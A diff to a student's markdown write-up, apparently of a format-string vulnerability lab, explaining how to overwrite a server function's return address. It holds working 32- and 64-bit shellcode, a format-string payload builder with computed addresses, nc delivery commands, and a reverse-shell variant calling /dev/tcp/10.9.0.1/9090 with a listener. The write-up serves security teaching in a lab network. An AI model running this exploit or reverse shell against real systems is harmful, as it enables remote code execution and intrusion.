@@ -524,12 +524,191 @@ cat badfile | nc -w2 10.9.0.5 9090
 This task involves injecting a piece of malicious code, in its binary format, into the server’s memory, and then use the format string vulnerability
 to modify the return address field of a function, so when the function returns, it jumps to our injected code.
 
-The technique used for this task is similar to that in the previous task: they both modify a 4-byte number in the memory. The previous task modifies the target variable, while this task modifies the return
-address field of a function. Students need to figure out the address for the return-address field based on the
-information printed out by the server.
+In order to inject malicious code into the server program, we would need to modify the value that is stored in the return address of the function we are exploiting. This lab has been designed in such a way that when the program runs, it prints out certain values for the student.
+
+We would be needing two values:
+- the frame-pointer address inside the vulnerable function
+- the input buffer's address
+
+From the information the server prints out, we can determine these values to be:
+- ffffd188 (frame-pointer address)
+- ffffd260 (input buffer's address)
+
+When we build our attack string, it will consist of the following:
+- the return address of the vulnerable function
+  - frame-pointer address + 4
+- the memory address of our malicious code:
+  - the input buffer's address + (a value yet to be determined)
+- the malicious code
+
+**image**
+
+```python
+#!/usr/bin/python3
+import sys
+
+# 32-bit Generic Shellcode 
+shellcode_32 = (
+   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
+   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
+   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
+   "/bin/bash*"
+   "-c*"
+   # The * in this line serves as the position marker         *
+   "/bin/ls -l; echo '===== Success! ======'                  *"
+   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
+   "BBBB"   # Placeholder for argv[1] --> "-c"
+   "CCCC"   # Placeholder for argv[2] --> the command string
+   "DDDD"   # Placeholder for argv[3] --> NULL
+).encode('latin-1')
 
 
+# 64-bit Generic Shellcode 
+shellcode_64 = (
+   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
+   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
+   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
+   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
+   "/bin/bash*"
+   "-c*"
+   # The * in this line serves as the position marker         *
+   "/bin/ls -l; echo '===== Success! ======'                  *"
+   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
+   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
+   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
+   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
+).encode('latin-1')
+
+# Choose the shellcode version based on your target
+shellcode = shellcode_32
+
+############################################################
+#    Construct the format string here                      #
+############################################################
+
+# return address    = 0xffffd18c
+# buffer address    = 0xffffd260
+# shellcode address = 0xffffd260 + 0x212 = 0xffffd472
+
+content = (0xffffd18c).to_bytes(4,byteorder='little')
+content += ("@@@@").encode('latin-1')
+content += (0xffffd18e).to_bytes(4,byteorder='little')
+
+# address 0xd472
+content += ("%.00600x" * 62).encode('latin-1')
+content += ("%.17174x%hn").encode('latin-1')
+
+# address 0xffff
+content += ("%.11149x%hn").encode('latin-1')
+
+# determine the size of content before adding the shellcode
+#print(f"size of content before shellcode = {len(content)}")    # 530 = 0x212
+
+# shellcode
+content += shellcode
 
 
+# Save the format string to file
+with open('badfile', 'wb') as f:
+  print(f"writing {len(content)} bytes to badfile...")
+  f.write(content)
+```
+
+**image**
+
+```bash
+python3 badfile.py
+cat badfile | nc -w2 10.9.0.5 9090
+```
+
+<details>
+<summary>Code explanation</summary>
+<div markdown="1">
+
+```python
+# return address    = 0xffffd18c
+# buffer address    = 0xffffd260
+# shellcode address = 0xffffd260 + 0x212 = 0xffffd472
+```
+
+I write out the addresses I would be needing for easy reference
+
+```python
+content = (0xffffd18c).to_bytes(4,byteorder='little')
+content += ("@@@@").encode('latin-1')
+content += (0xffffd18e).to_bytes(4,byteorder='little')
+```
+
+The return address will be written 2-bytes at a time, so I start the payload with the address that will contain a lower value, pad it with 4-bytes to account for the %hn% format specifier, and conclude with the address that will contain a higher value.
+
+```python
+# address 0xd472
+content += ("%.00600x" * 62).encode('latin-1')
+content += ("%.17174x%hn").encode('latin-1')
+
+# address 0xffff
+content += ("%.11149x%hn").encode('latin-1')
+```
+
+This is used to count up to 0xd472 and write it into 0xfffd18c.
+Since the size of the payload before the shellcode is added is yet to be determined, in order to maintain a definite size, I set the %x format specifers to initially be "%.00000x". This way, when i have determined the shellcode address, I can modify the specifiers and still maintain a constant size.
+
+```python
+# determine the size of content before adding the shellcode
+#print(f"size of content before shellcode = {len(content)}")    # 530 = 0x212
+```
+
+I use this block of code to initially print the offset form the start of the payload where the shellcode will reside in memory. After running the program, I get a value of 513. I can now do the following:
+- determine the shellcode address by adding the offset to the buffer address.
+- use the calculated address to build the format specifiers
+
+</div></details>
+
+#### Getting a Reverse Shell
+
+Getting a shell is more interesting than running arbritrary commands. The goal of this task is to get a shell on the target server, so we can type any command we want. 
+
+To achieve this all that needs to be edited is the command argument of the bash command in the shell code.
+
+```python
+#!/usr/bin/python3
+import sys
+
+# 32-bit Generic Shellcode 
+shellcode_32 = (
+   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
+   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
+   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
+   "/bin/bash*"
+   "-c*"
+   # The * in this line serves as the position marker         *
+   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
+   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
+   "BBBB"   # Placeholder for argv[1] --> "-c"
+   "CCCC"   # Placeholder for argv[2] --> the command string
+   "DDDD"   # Placeholder for argv[3] --> NULL
+).encode('latin-1')
+
+# existing code continues below
+```
+
+Next is to set up a listener...
+
+```bash
+nc -nvl 9090
+```
+
+then run the attack.
+```bash
+python3 badfile.py
+cat badfile | nc -w2 10.9.0.5 9090
+```
+
+**image**
+
+
+<br>
+
+### Attacking the 64-bit Server Program
 
 
